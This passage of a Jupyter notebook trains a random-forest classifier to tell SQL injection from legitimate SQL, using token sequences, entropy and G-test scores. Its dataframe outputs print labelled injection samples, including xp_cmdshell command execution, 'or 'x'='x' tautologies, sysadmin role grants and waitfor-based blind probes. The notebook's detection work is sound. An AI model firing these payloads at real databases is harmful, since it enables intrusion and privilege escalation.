       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>raw_sql</th>\n",
       "      <th>type</th>\n",
       "      <th>parsed_sql</th>\n",
       "      <th>sequences</th>\n",
       "      <th>length</th>\n",
       "      <th>entropy</th>\n",
       "      <th>malicious_g</th>\n",
       "      <th>legit_g</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>create user name identified by pass123 tempora...</td>\n",
       "      <td>malicious</td>\n",
       "      <td>[DDL, Keyword, Identifier, Keyword, Keyword, I...</td>\n",
       "      <td>[('DDL',), ('Keyword',), ('Identifier',), ('Ke...</td>\n",
       "      <td>13</td>\n",
       "      <td>4.028603</td>\n",
       "      <td>-534.768307</td>\n",
       "      <td>1770.669756</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>6</th>\n",
       "      <td>grant connect to name; grant resource to name;</td>\n",
       "      <td>malicious</td>\n",
       "      <td>[Keyword, Keyword, Keyword, Identifier, Punctu...</td>\n",
       "      <td>[('Keyword',), ('Keyword',), ('Keyword',), ('I...</td>\n",
       "      <td>10</td>\n",
       "      <td>3.498879</td>\n",
       "      <td>-408.294453</td>\n",
       "      <td>1460.987448</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>7</th>\n",
       "      <td>insert into users(login, password, level) valu...</td>\n",
       "      <td>malicious</td>\n",
       "      <td>[DML, Keyword, Function, Keyword, Punctuation,...</td>\n",
       "      <td>[('DML',), ('Keyword',), ('Function',), ('Keyw...</td>\n",
       "      <td>6</td>\n",
       "      <td>4.387660</td>\n",
       "      <td>-298.329569</td>\n",
       "      <td>761.956282</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>46</th>\n",
       "      <td>CREATE FUNCTION sylph.add_article(char, char, ...</td>\n",
       "      <td>legit</td>\n",
       "      <td>[DDL, Keyword, Identifier, Keyword, Identifier...</td>\n",
       "      <td>[('DDL',), ('Keyword',), ('Identifier',), ('Ke...</td>\n",
       "      <td>9</td>\n",
       "      <td>4.948830</td>\n",
       "      <td>-43.285061</td>\n",
       "      <td>826.968141</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>47</th>\n",
       "      <td>CREATE FUNCTION sylph.add_comment(integer, cha...</td>\n",
       "      <td>legit</td>\n",
       "      <td>[DDL, Keyword, Identifier, Keyword, Identifier...</td>\n",
       "      <td>[('DDL',), ('Keyword',), ('Identifier',), ('Ke...</td>\n",
       "      <td>9</td>\n",
       "      <td>5.019598</td>\n",
       "      <td>-40.639876</td>\n",
       "      <td>821.782561</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                              raw_sql       type  \\\n",
       "2   create user name identified by pass123 tempora...  malicious   \n",
       "6      grant connect to name; grant resource to name;  malicious   \n",
       "7   insert into users(login, password, level) valu...  malicious   \n",
       "46  CREATE FUNCTION sylph.add_article(char, char, ...      legit   \n",
       "47  CREATE FUNCTION sylph.add_comment(integer, cha...      legit   \n",
       "\n",
       "                                           parsed_sql  \\\n",
       "2   [DDL, Keyword, Identifier, Keyword, Keyword, I...   \n",
       "6   [Keyword, Keyword, Keyword, Identifier, Punctu...   \n",
       "7   [DML, Keyword, Function, Keyword, Punctuation,...   \n",
       "46  [DDL, Keyword, Identifier, Keyword, Identifier...   \n",
       "47  [DDL, Keyword, Identifier, Keyword, Identifier...   \n",
       "\n",
       "                                            sequences  length   entropy  \\\n",
       "2   [('DDL',), ('Keyword',), ('Identifier',), ('Ke...      13  4.028603   \n",
       "6   [('Keyword',), ('Keyword',), ('Keyword',), ('I...      10  3.498879   \n",
       "7   [('DML',), ('Keyword',), ('Function',), ('Keyw...       6  4.387660   \n",
       "46  [('DDL',), ('Keyword',), ('Identifier',), ('Ke...       9  4.948830   \n",
       "47  [('DDL',), ('Keyword',), ('Identifier',), ('Ke...       9  5.019598   \n",
       "\n",
       "    malicious_g      legit_g  \n",
       "2   -534.768307  1770.669756  \n",
       "6   -408.294453  1460.987448  \n",
       "7   -298.329569   761.956282  \n",
       "46   -43.285061   826.968141  \n",
       "47   -40.639876   821.782561  "
      ]
     },
     "execution_count": 101,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "dataframe[dataframe['sequences'].map(lambda x: \"('Punctuation',)\" in x)].head()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<div style=\"float: left; padding:10px;\"><img src=\"files/images/hilarious.jpg\" width=\"400px\"></div>\n",
    "<font size=4>\n",
    "The results above are a mixed bag of both 'legit' and 'malicious'. As we'd expect ('Punctuation') can't really be used as a 'signature' to effectively differentiate malicious sql statements. However, it's cool that the data transformation into the parsed tokens helps us generalize and find interesing malicious patterns. \n",
    "<br><br>So even though these individual features can't be used to differentiate.. when we build a 'feature vector' of a set of features, machine learning algorithms can use those vectors to build non-linear functional decision boundaries in multi-dimensional spaces (and we laugh at this point because it's hard to take yourself serious after saying a bunch of fancy stuff...). BTW the image is a total non sequitur.\n",
    "</font>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 102,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style>\n",
       "    .dataframe thead tr:only-child th {\n",
       "        text-align: right;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: left;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>raw_sql</th>\n",
       "      <th>type</th>\n",
       "      <th>parsed_sql</th>\n",
       "      <th>sequences</th>\n",
       "      <th>length</th>\n",
       "      <th>entropy</th>\n",
       "      <th>malicious_g</th>\n",
       "      <th>legit_g</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>'; exec master..xp_cmdshell 'ping 10.10.1.2'--</td>\n",
       "      <td>malicious</td>\n",
       "      <td>[Single, Identifier, Float, Float, Float, Erro...</td>\n",
       "      <td>[('Single',), ('Identifier',), ('Float',), ('F...</td>\n",
       "      <td>7</td>\n",
       "      <td>4.368792</td>\n",
       "      <td>509.513630</td>\n",
       "      <td>-76.722266</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>create user name identified by 'pass123'</td>\n",
       "      <td>malicious</td>\n",
       "      <td>[DDL, Keyword, Identifier, Keyword, Keyword, S...</td>\n",
       "      <td>[('DDL',), ('Keyword',), ('Identifier',), ('Ke...</td>\n",
       "      <td>6</td>\n",
       "      <td>4.037326</td>\n",
       "      <td>-356.982564</td>\n",
       "      <td>1526.666886</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>create user name identified by pass123 tempora...</td>\n",
       "      <td>malicious</td>\n",
       "      <td>[DDL, Keyword, Identifier, Keyword, Keyword, I...</td>\n",
       "      <td>[('DDL',), ('Keyword',), ('Identifier',), ('Ke...</td>\n",
       "      <td>13</td>\n",
       "      <td>4.028603</td>\n",
       "      <td>-534.768307</td>\n",
       "      <td>1770.669756</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>exec sp_addlogin 'name' , 'password'</td>\n",
       "      <td>malicious</td>\n",
       "      <td>[Keyword, Identifier, IdentifierList]</td>\n",
       "      <td>[('Keyword',), ('Identifier',), ('IdentifierLi...</td>\n",
       "      <td>3</td>\n",
       "      <td>4.030493</td>\n",
       "      <td>-305.349103</td>\n",
       "      <td>1218.129498</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>exec sp_addsrvrolemember 'name' , 'sysadmin'</td>\n",
       "      <td>malicious</td>\n",
       "      <td>[Keyword, Identifier, IdentifierList]</td>\n",
       "      <td>[('Keyword',), ('Identifier',), ('IdentifierLi...</td>\n",
       "      <td>3</td>\n",
       "      <td>4.010013</td>\n",
       "      <td>-305.349103</td>\n",
       "      <td>1218.129498</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                             raw_sql       type  \\\n",
       "0     '; exec master..xp_cmdshell 'ping 10.10.1.2'--  malicious   \n",
       "1           create user name identified by 'pass123'  malicious   \n",
       "2  create user name identified by pass123 tempora...  malicious   \n",
       "3               exec sp_addlogin 'name' , 'password'  malicious   \n",
       "4       exec sp_addsrvrolemember 'name' , 'sysadmin'  malicious   \n",
       "\n",
       "                                          parsed_sql  \\\n",
       "0  [Single, Identifier, Float, Float, Float, Erro...   \n",
       "1  [DDL, Keyword, Identifier, Keyword, Keyword, S...   \n",
       "2  [DDL, Keyword, Identifier, Keyword, Keyword, I...   \n",
       "3              [Keyword, Identifier, IdentifierList]   \n",
       "4              [Keyword, Identifier, IdentifierList]   \n",
       "\n",
       "                                           sequences  length   entropy  \\\n",
       "0  [('Single',), ('Identifier',), ('Float',), ('F...       7  4.368792   \n",
       "1  [('DDL',), ('Keyword',), ('Identifier',), ('Ke...       6  4.037326   \n",
       "2  [('DDL',), ('Keyword',), ('Identifier',), ('Ke...      13  4.028603   \n",
       "3  [('Keyword',), ('Identifier',), ('IdentifierLi...       3  4.030493   \n",
       "4  [('Keyword',), ('Identifier',), ('IdentifierLi...       3  4.010013   \n",
       "\n",
       "   malicious_g      legit_g  \n",
       "0   509.513630   -76.722266  \n",
       "1  -356.982564  1526.666886  \n",
       "2  -534.768307  1770.669756  \n",
       "3  -305.349103  1218.129498  \n",
       "4  -305.349103  1218.129498  "
      ]
     },
     "execution_count": 102,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Generating additional feature dimensions for the machine learning to expand its mind into...\n",
    "# We're basically building up features to include into our 'feature vector' for ML\n",
    "import math\n",
    "from collections import Counter\n",
    "def entropy(s):\n",
    "    p, lns = Counter(s), float(len(s))\n",
    "    return -sum( count/lns * math.log(count/lns, 2) for count in p.values())\n",
    "dataframe['length'] = dataframe['parsed_sql'].map(lambda x: len(x))\n",
    "dataframe['entropy'] = dataframe['raw_sql'].map(lambda x: entropy(x))\n",
    "dataframe.head()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 103,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "# For each SQL statement aggregate the malicious and legit g-test scores as features\n",
    "import numpy as np\n",
    "def g_aggregate(sequence, name):\n",
    "    try:\n",
    "        g_scores = [df_stats.loc[item][name] for item in sequence]\n",
    "    except KeyError:\n",
    "        return 0\n",
    "    return sum(g_scores)/len(g_scores) if g_scores else 0 # Average\n",
    "dataframe['malicious_g'] = dataframe['sequences'].map(lambda x: g_aggregate(x, 'malicious_g'))\n",
    "dataframe['legit_g'] = dataframe['sequences'].map(lambda x: g_aggregate(x, 'legit_g'))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 104,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style>\n",
       "    .dataframe thead tr:only-child th {\n",
       "        text-align: right;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: left;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>raw_sql</th>\n",
       "      <th>type</th>\n",
       "      <th>parsed_sql</th>\n",
       "      <th>sequences</th>\n",
       "      <th>length</th>\n",
       "      <th>entropy</th>\n",
       "      <th>malicious_g</th>\n",
       "      <th>legit_g</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>'; exec master..xp_cmdshell 'ping 10.10.1.2'--</td>\n",
       "      <td>malicious</td>\n",
       "      <td>[Single, Identifier, Float, Float, Float, Erro...</td>\n",
       "      <td>[('Single',), ('Identifier',), ('Float',), ('F...</td>\n",
       "      <td>7</td>\n",
       "      <td>4.368792</td>\n",
       "      <td>509.513630</td>\n",
       "      <td>-76.722266</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>create user name identified by 'pass123'</td>\n",
       "      <td>malicious</td>\n",
       "      <td>[DDL, Keyword, Identifier, Keyword, Keyword, S...</td>\n",
       "      <td>[('DDL',), ('Keyword',), ('Identifier',), ('Ke...</td>\n",
       "      <td>6</td>\n",
       "      <td>4.037326</td>\n",
       "      <td>-356.982564</td>\n",
       "      <td>1526.666886</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>create user name identified by pass123 tempora...</td>\n",
       "      <td>malicious</td>\n",
       "      <td>[DDL, Keyword, Identifier, Keyword, Keyword, I...</td>\n",
       "      <td>[('DDL',), ('Keyword',), ('Identifier',), ('Ke...</td>\n",
       "      <td>13</td>\n",
       "      <td>4.028603</td>\n",
       "      <td>-534.768307</td>\n",
       "      <td>1770.669756</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>exec sp_addlogin 'name' , 'password'</td>\n",
       "      <td>malicious</td>\n",
       "      <td>[Keyword, Identifier, IdentifierList]</td>\n",
       "      <td>[('Keyword',), ('Identifier',), ('IdentifierLi...</td>\n",
       "      <td>3</td>\n",
       "      <td>4.030493</td>\n",
       "      <td>-305.349103</td>\n",
       "      <td>1218.129498</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>exec sp_addsrvrolemember 'name' , 'sysadmin'</td>\n",
       "      <td>malicious</td>\n",
       "      <td>[Keyword, Identifier, IdentifierList]</td>\n",
       "      <td>[('Keyword',), ('Identifier',), ('IdentifierLi...</td>\n",
       "      <td>3</td>\n",
       "      <td>4.010013</td>\n",
       "      <td>-305.349103</td>\n",
       "      <td>1218.129498</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                             raw_sql       type  \\\n",
       "0     '; exec master..xp_cmdshell 'ping 10.10.1.2'--  malicious   \n",
       "1           create user name identified by 'pass123'  malicious   \n",
       "2  create user name identified by pass123 tempora...  malicious   \n",
       "3               exec sp_addlogin 'name' , 'password'  malicious   \n",
       "4       exec sp_addsrvrolemember 'name' , 'sysadmin'  malicious   \n",
       "\n",
       "                                          parsed_sql  \\\n",
       "0  [Single, Identifier, Float, Float, Float, Erro...   \n",
       "1  [DDL, Keyword, Identifier, Keyword, Keyword, S...   \n",
       "2  [DDL, Keyword, Identifier, Keyword, Keyword, I...   \n",
       "3              [Keyword, Identifier, IdentifierList]   \n",
       "4              [Keyword, Identifier, IdentifierList]   \n",
       "\n",
       "                                           sequences  length   entropy  \\\n",
       "0  [('Single',), ('Identifier',), ('Float',), ('F...       7  4.368792   \n",
       "1  [('DDL',), ('Keyword',), ('Identifier',), ('Ke...       6  4.037326   \n",
       "2  [('DDL',), ('Keyword',), ('Identifier',), ('Ke...      13  4.028603   \n",
       "3  [('Keyword',), ('Identifier',), ('IdentifierLi...       3  4.030493   \n",
       "4  [('Keyword',), ('Identifier',), ('IdentifierLi...       3  4.010013   \n",
       "\n",
       "   malicious_g      legit_g  \n",
       "0   509.513630   -76.722266  \n",
       "1  -356.982564  1526.666886  \n",
       "2  -534.768307  1770.669756  \n",
       "3  -305.349103  1218.129498  \n",
       "4  -305.349103  1218.129498  "
      ]
     },
     "execution_count": 104,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "dataframe.head()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 105,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<matplotlib.text.Text at 0x1167de358>"
      ]
     },
     "execution_count": 105,
     "metadata": {},
     "output_type": "execute_result"
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<matplotlib.figure.Figure at 0x118efb518>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<matplotlib.figure.Figure at 0x118efb550>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "# Boxplots show you the distribution of the data (spread).\n",
    "# http://en.wikipedia.org/wiki/Box_plot\n",
    "\n",
    "# Plot the length and entropy of SQL statements\n",
    "# Fixme Brian: make these pretty\n",
    "dataframe.boxplot('length','type')\n",
    "plt.ylabel('SQL Statement Length')\n",
    "dataframe.boxplot('entropy','type')\n",
    "plt.ylabel('SQL Statement Entropy')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 106,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<matplotlib.text.Text at 0x119486e80>"
      ]
     },
     "execution_count": 106,
     "metadata": {},
     "output_type": "execute_result"
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<matplotlib.figure.Figure at 0x1167de2b0>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "# Split the classes up so we can set colors, size, labels\n",
    "fig, ax = plt.subplots(subplot_kw=dict(facecolor='#EEEEE5'))\n",
    "ax.grid(color='grey', linestyle='solid')\n",
    "cond = dataframe['type'] == 'malicious'\n",
    "evil = dataframe[cond]\n",
    "legit = dataframe[~cond]\n",
    "plt.scatter(legit['length'], legit['entropy'], s=140, c='#aaaaff', label='Legit', alpha=.7)\n",
    "plt.scatter(evil['length'], evil['entropy'], s=40, c='r', label='Injections', alpha=.3)\n",
    "plt.legend()\n",
    "plt.xlabel('SQL Statement Length')\n",
    "plt.ylabel('SQL Statement Entropy')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 107,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<matplotlib.text.Text at 0x11a7adb70>"
      ]
     },
     "execution_count": 107,
     "metadata": {},
     "output_type": "execute_result"
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<matplotlib.figure.Figure at 0x11830aeb8>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "# Split the classes up so we can set colors, size, labels\n",
    "fig, ax = plt.subplots(subplot_kw=dict(facecolor='#EEEEE5'))\n",
    "ax.grid(color='grey', linestyle='solid')\n",
    "plt.scatter(legit['malicious_g'], legit['legit_g'], s=140, c='#aaaaff', label='Legit', alpha=.7)\n",
    "plt.scatter(evil['malicious_g'], evil['legit_g'], s=40, c='r', label='Injections', alpha=.3)\n",
    "plt.legend()\n",
    "plt.ylabel('Legit SQL G-Test Score')\n",
    "plt.xlabel('Malicious SQL G-Test Score')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 108,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "# In preparation for using scikit learn we're just going to use\n",
    "# some handles that help take us from pandas land to scikit land\n",
    "\n",
    "# List of feature vectors (scikit learn uses 'X' for the matrix of feature vectors)\n",
    "X = dataframe.as_matrix(['length', 'entropy','legit_g','malicious_g'])\n",
    "\n",
    "# Labels (scikit learn uses 'y' for classification labels)\n",
    "y = np.array(dataframe['type'].tolist())  # Yes, this is weird but it needs \n",
    "                                            # to be an np.array of strings"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 109,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "# Random Forest is a popular ensemble machine learning classifier.\n",
    "# http://scikit-learn.org/dev/modules/generated/sklearn.ensemble.RandomForestClassifier.html\n",
    "#\n",
    "import sklearn.ensemble\n",
    "clf = sklearn.ensemble.RandomForestClassifier(n_estimators=20) # Trees in the forest"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "ref: [sklearn.model_selection.cross_val_score v0.19.0](http://scikit-learn.org/stable/modules/generated/sklearn.model_selection.cross_val_score.html)\n",
    "\n",
    "> sklearn.model_selection.cross_val_score(estimator, X, y=None, groups=None, scoring=None, cv=None, n_jobs=1, verbose=0, fit_params=None, pre_dispatch=‘2*n_jobs’)\n",
    "\n",
    "cv : int, cross-validation generator or an iterable, optional\n",
    "\n",
    "Determines the cross-validation splitting strategy. Possible inputs for cv are:\n",
    "\n",
    "* None, to use the default 3-fold cross validation,\n",
    "* integer, to specify the number of folds in a (Stratified)KFold,\n",
    "* An object to be used as a cross-validation generator.\n",
    "* An iterable yielding train, test splits.\n",
    "\n",
    "n_jobs : integer, optional\n",
    "\n",
    "The number of CPUs to use to do the computation. -1 means ‘all CPUs’.\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 110,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[ 0.98418404  0.99856219  0.99928058  0.99784017  0.99640029  0.97552196\n",
      "  0.99856012  0.99640029  0.99784017  0.99424046]\n"
     ]
    }
   ],
   "source": [
    "# Now we can use scikit learn's cross validation to assess predictive performance.\n",
    "import sklearn.model_selection\n",
    "scores = sklearn.model_selection.cross_val_score(clf, X, y, cv=10, n_jobs=-1)\n",
    "print(scores)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 111,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "# Wow 99% accurate! There is an issue though...\n",
    "# Recall that we have ~13k 'malicious SQL statements and\n",
    "# we only have about 1k 'legit' SQL statements, so we dive \n",
    "# in a bit and look at the predictive performance more deeply.\n",
    "\n",
    "# Train on a 80/20 split\n",
    "from sklearn.model_selection import train_test_split\n",
    "X_train, X_test, y_train, y_test, index_train, index_test = train_test_split(X, y, dataframe.index, test_size=0.2)\n",
    "clf.fit(X_train, y_train)\n",
    "y_pred = clf.predict(X_test)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 112,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Confusion Matrix Stats\n",
      "legit/legit: 97.21% (209/215)\n",
      "legit/malicious: 2.79% (6/215)\n",
      "malicious/legit: 0.16% (4/2564)\n",
      "malicious/malicious: 99.84% (2560/2564)\n"
     ]
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<matplotlib.figure.Figure at 0x118f60358>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "# Now plot the results of the 80/20 split in a confusion matrix\n",
    "from sklearn.metrics import confusion_matrix\n",
    "labels = ['legit', 'malicious']\n",
    "cm = confusion_matrix(y_test, y_pred, labels)\n",
    "\n",
    "def plot_cm(cm, labels):\n",
    "    \n",
    "    # Compute percentanges\n",
    "    percent = (cm*100.0)/np.array(np.matrix(cm.sum(axis=1)).T)  # Derp, I'm sure there's a better way\n",
    "    \n",
    "    print('Confusion Matrix Stats')\n",
    "    for i, label_i in enumerate(labels):\n",
    "        for j, label_j in enumerate(labels):\n",
    "            print(\"%s/%s: %.2f%% (%d/%d)\" % (label_i, label_j, (percent[i][j]), cm[i][j], cm[i].sum()))\n",
    "\n",
    "    # Show confusion matrix\n",
    "    # Thanks kermit666 from stackoverflow :)\n",
    "    fig = plt.figure()\n",
    "    ax = fig.add_subplot(111)\n",
    "    ax.grid(b=False)\n",
    "    cax = ax.matshow(percent, cmap='coolwarm')\n",
    "    plt.title('Confusion matrix of the classifier')\n",
    "    fig.colorbar(cax)\n",
    "    ax.set_xticklabels([''] + labels)\n",
    "    ax.set_yticklabels([''] + labels)\n",
    "    plt.xlabel('Predicted')\n",
    "    plt.ylabel('Truth')\n",
    "    plt.show()\n",
    "\n",
    "plot_cm(cm, labels)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 135,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style>\n",
       "    .dataframe thead tr:only-child th {\n",
       "        text-align: right;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: left;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>raw_sql</th>\n",
       "      <th>type</th>\n",
       "      <th>parsed_sql</th>\n",
       "      <th>sequences</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>'; exec master..xp_cmdshell 'ping 10.10.1.2'--</td>\n",
       "      <td>malicious</td>\n",
       "      <td>[Single, Identifier, Float, Float, Float, Erro...</td>\n",
       "      <td>[('Single',), ('Identifier',), ('Float',), ('F...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1033</th>\n",
       "      <td>anything' or 'x'='x</td>\n",
       "      <td>malicious</td>\n",
       "      <td>[Identifier, Single, Identifier, Single, Ident...</td>\n",
       "      <td>[('Identifier',), ('Single',), ('Identifier',)...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1038</th>\n",
       "      <td>'; exec master..xp_cmdshell 'ping aaa.bbb.ccc....</td>\n",
       "      <td>malicious</td>\n",
       "      <td>[Single, Identifier, Error, Single]</td>\n",
       "      <td>[('Single',), ('Identifier',), ('Error',), ('S...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1043</th>\n",
       "      <td>'; if not(select system_user) &lt;&gt; 'sa' waitfor ...</td>\n",
       "      <td>malicious</td>\n",
       "      <td>[Single, Identifier, Single, Integer, Punctuat...</td>\n",
       "      <td>[('Single',), ('Identifier',), ('Single',), ('...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1044</th>\n",
       "      <td>'; if is_srvrolemember('sysadmin') &gt; 0 waitfor...</td>\n",
       "      <td>malicious</td>\n",
       "      <td>[Single, Identifier, Single, Integer, Punctuat...</td>\n",
       "      <td>[('Single',), ('Identifier',), ('Single',), ('...</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                                raw_sql       type  \\\n",
       "0        '; exec master..xp_cmdshell 'ping 10.10.1.2'--  malicious   \n",
       "1033                                anything' or 'x'='x  malicious   \n",
       "1038  '; exec master..xp_cmdshell 'ping aaa.bbb.ccc....  malicious   \n",
       "1043  '; if not(select system_user) <> 'sa' waitfor ...  malicious   \n",
       "1044  '; if is_srvrolemember('sysadmin') > 0 waitfor...  malicious   \n",
       "\n",
       "                                             parsed_sql  \\\n",
       "0     [Single, Identifier, Float, Float, Float, Erro...   \n",
       "1033  [Identifier, Single, Identifier, Single, Ident...   \n",
       "1038                [Single, Identifier, Error, Single]   \n",
       "1043  [Single, Identifier, Single, Integer, Punctuat...   \n",
       "1044  [Single, Identifier, Single, Integer, Punctuat...   \n",
       "\n",
       "                                              sequences  \n",
       "0     [('Single',), ('Identifier',), ('Float',), ('F...  \n",
       "1033  [('Identifier',), ('Single',), ('Identifier',)...  \n",
       "1038  [('Single',), ('Identifier',), ('Error',), ('S...  \n",
       "1043  [('Single',), ('Identifier',), ('Single',), ('...  \n",
       "1044  [('Single',), ('Identifier',), ('Single',), ('...  "
      ]
     },
     "execution_count": 135,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Documentation in sqlparse for the mapping can be found here: \n",
    "# https://github.com/andialbrecht/sqlparse/blob/master/sqlparse/keywords.py\n",
    "# or here\n",
    "# https://github.com/andialbrecht/sqlparse/blob/master/sqlparse/lexer.py\n",
    "\n",
    "# Here we look at example of the SQL sequence that G-Test has indicated are good\n",
    "# indicators of SQL injections.\n",
    "dataframe[dataframe['sequences'].map(lambda x: \"('Single', 'Identifier')\" in x)].head()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<div style=\"float: right; padding:10px;\"><img src=\"files/images/sad_party.jpg\" width=\"200px\"></div>\n",
    "<font size=4>Yea! Those scores look totally awesome, lets have a Party! But later we realize that if your system is processing 1 Million sql statements that with the predictive performance above you'll get tens of thousands of false positives, so now it's a Sad Party :(\n",
    "<br><br>\n",
    "But our Mom said we were still cool.. so we're going to exercise another nice feature. Most of the machine learning algorithm in scikit learn have a companion function to the normal 'predict' function... called 'predict_proba' where the model will compute the probability of that class matching based on various metrics. For instance, random forest bases the probability function on how many of the trees in the forest voted one way or the other.. so a probability of .7 means that 70% of the trees voted one way and the other 30% voted the other way.</font>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 136,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Confusion Matrix Stats\n",
      "legit/legit: 98.60% (212/215)\n",
      "legit/malicious: 1.40% (3/215)\n",
      "malicious/legit: 0.62% (16/2564)\n",
      "malicious/malicious: 99.38% (2548/2564)\n"
     ]
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<matplotlib.figure.Figure at 0x11c6d2e48>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "# Compute the precition probabilities and use them to mimimize our false positives\n",
    "# Note: This is simply a trade off, it means we'll miss a few of the malicious\n",
    "# ones but typically false alarms are a death blow to any new 'fancy stuff' so\n",
    "# we definitely want to mimimize the false alarms.\n",
    "y_probs = clf.predict_proba(X_test)[:,1]\n",
    "thres = .95 # This can be set to whatever you'd like\n",
